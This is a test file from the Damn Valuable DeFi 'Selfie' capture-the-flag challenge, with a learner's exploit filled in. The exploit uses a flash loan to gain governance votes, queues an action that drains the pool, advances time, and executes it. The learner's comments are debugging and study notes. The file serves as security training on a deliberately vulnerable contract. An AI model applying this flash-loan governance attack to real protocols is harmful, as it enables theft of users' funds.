const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        //Queue the action, you exploit then wait 2 days to execute the code
        // But it seems like this governance token is useless?
        // okay nvm cause onlyGovernance Modifier is there, we have to queue the action then 2 days later use the governance token to call that


        const AttackspFactory = await ethers.getContractFactory("Attacksp",attacker);
        const AttackspCon = await AttackspFactory.deploy(this.pool.address,this.token.address,this.governance.address,attacker.address);
        const attackTx = await AttackspCon.queueAttack();
        const attackTxReciept = await attackTx.wait(1);
        // We are getting the event from the Tx Receipt
        // But which event are we accessing
        console.log(attackTxReciept)
        // So from the console.log we have 5 events emitted and QueueAttack event is the last event emitted
        let actionId = attackTxReciept.events[4].args.actionId;
        let amount = attackTxReciept.events[4].args.amount;

        // First action is to use flashloan to queue the attack with the attacker contract
        // then fast forward 2 days to execute the attack with the Simple governance token
        await ethers.provider.send("evm_increaseTime",[2*24*60*60]); // 2 days

        //attack by executing
        //ERC20 Snapshot starts at 1 not 0
        await AttackspCon.attack(actionId);


        // Error: VM Exception while processing transaction: reverted with reason string 'Address: insufficient balance for call'
        // i got insufficient balance for call
        // okay nvm i was dumb  below is the error where by, the weiAmount is the amount of amount you are sending to execute the function call
        // it is suppose to 0 but i put the entire poolbalance amount
        /*function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256)

        */


        /** What i need to know after doing this challenge
         * I need to get use to knowing the functions in the ERC20snapshot extension and governance token
         * Need to know how to emit events properly in Solidity
         *  - my question for this is i called the queueAttack and the queueAttack then calls flashloan whihc then calls recieveTokens 
         *  - receiveTokens is the function that logs out event which emits the actionId, so how do i get this? would this be the 3rd log
         *  - need to know about indexed vs unindexed events 
         * Event logs in transaction, should be something i should know, as the events logs it out
         *  - need to learn how to automatically filter an event log probably with try catch? 
         *  - because i am doing it manually right now
         * erc20 tokens
         * https://docs.openzeppelin.com/contracts/3.x/erc20#:~:text=When%20minting%20tokens%20or%20transferring,value%20of%2018%20for%20decimals%20.
         * The reason why i keep getting insufficient balance is that ERC20 tokens are minted in 10*10 while solidity transact in wei which is 10^18 decimals
         */



    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
